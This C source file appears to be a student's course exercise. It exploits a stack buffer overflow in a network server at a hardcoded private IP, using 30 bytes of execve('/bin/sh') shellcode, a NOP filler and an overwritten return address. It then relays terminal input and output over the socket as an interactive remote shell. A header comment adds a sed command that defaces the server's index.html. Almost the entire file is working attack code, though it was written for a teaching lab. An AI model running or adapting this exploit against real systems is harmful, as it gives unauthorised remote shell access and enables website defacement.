/*Done in colab with Joaqu√≠n Castanon

Inspired in the explication, commands and layout from the computerphile video:
https://www.youtube.com/watch?v=1S0aBV-Waeo&t=498s - Buffer Overflow Exploits

and explication and code from https://turkeyland.net/projects/overflow/exploit.php (Indicated by Matheus Carius - Student from last year's course)
*/

/*
IMPORTANT README:
Don't forget to change the IP_SERVER define to the IP that suits you
To change the "Winners Page":
AFTER CONNECTING TYPE: cd var/www/html;sed -i 's/<\/body>/<div> "Hugo Serrao" <\/div><\/body>/' index.html;
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <pthread.h>
#define IP_SERVER "192.168.185.129"//Idk why but my computer always changes the IP-Address


//Shell Code from:  http://shell-storm.org/shellcode/files/shellcode-606.php
//To open a "weak terminal" - similar to the one in the computerphile-video
int size_sc = 30;
u_int8_t sc[30] = { 0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05};//Our shellcode

/*
    ; execve("/bin/sh", ["/bin/sh"], NULL)
 
    section .text
            global _start
 
    _start:
            xor     rdx, rdx
            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            push    rbx
            mov     rdi, rsp
            push    rax
            push    rdi
            mov     rsi, rsp
            mov     al, 0x3b
            syscall
*/
//-------------------------------------------------------------------------
long retorno_addr = 0x7fffffffe5f0;//"Buffer Adress" (to reach the shell code) -> we have the right address from the programs DEBUG_OUTPUT 


//Global Variables
int mysocket;

//Declaring Funtions
void *socket_stdout();
void *socket_stdin();

int main(int argc, char *argv[]){

    struct sockaddr_in server_addr;
    u_int8_t buf[256];//Simulate the buffer from parse()
    u_int8_t *end;//
    mysocket = socket(PF_INET, SOCK_STREAM, 0);
    if(mysocket == -1){
        puts("Error creating socket");
        exit(3);
    }

    memset(&server_addr, 0, sizeof(struct sockaddr_in));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(IP_SERVER);
    server_addr.sin_port = htons(4321);
    
    memset(buf, 0x90, 256);//We fill buf with some \x90 to ensure we are going to execute the shell code and note some garbage in it

    u_int8_t* addr = buf;

                      /*Memoire Stack (using GDB)
                      |--------------------------------------|----------------|--------|-----|           |-------------|
                          Buffer                             Greeting_text    RBP      return_address  prameters/variable   Function
                      |                  256                 |     128        |     8  |  6  |           |
                      */

    //Shell-Code at the begining
    memcpy(buf, sc, size_sc);
    addr += size_sc;//30
    //Why not 100 as we had calculated?? Because in the virtual machine we have some other local variables
    //Part with the \x90's -  I started with 100 (calculated with gdb in my machine) and then I tried the numbers around it to try to reach the correct address (110 was the one) 
    addr += 110;//140
    //Place the return_address to the beggining of the buffer (where we have the shellcode)
    memcpy(addr, &retorno_addr, 6);
    addr += 6;//146
    // Append a '\0'
    *(addr) = 0x00;// '\0' to show the end to the strcat, so we don't flood other areas 
    //to state telnet
    connect(mysocket, (struct sockaddr*) &server_addr, sizeof(struct sockaddr_in));

    usleep(1000);

    
    if (send(mysocket, buf, sizeof(buf), 0) == -1) {
        perror("send");
        exit(2);
    }
    //If we just send it one time we do not keep having the connection to write our commands because the program terminates (as we had in the UDP server/client in tuto 2). 
    //Sugested by Matheus Carius (Student from last year's course): Create a Infinity Thread for receiving and a Infinity Thread for sending so we can keep it open and send our commands

    pthread_t in, out;

    pthread_create(&in, NULL, socket_stdout, NULL);
    pthread_create(&out, NULL, socket_stdin, NULL);
    pthread_join(in, NULL);
    pthread_join(out, NULL);
    printf("eajdoifasd");
    return 0;
}

//socket->stdout
void *socket_stdout() {
    char str[512];
    FILE* sock_in = fdopen(mysocket, "r");
    while(1) {
      if(!fgets(str, 512, sock_in))
      exit(EXIT_SUCCESS);
      fputs(str, stdout);
    }
}
//stdin->socket
void *socket_stdin() {
  char str[512];
  FILE* sock_out = fdopen(mysocket, "w");
  while(1) {
    fgets(str, 512, stdin);
    fputs(str, sock_out);
    fflush(sock_out);
  }
}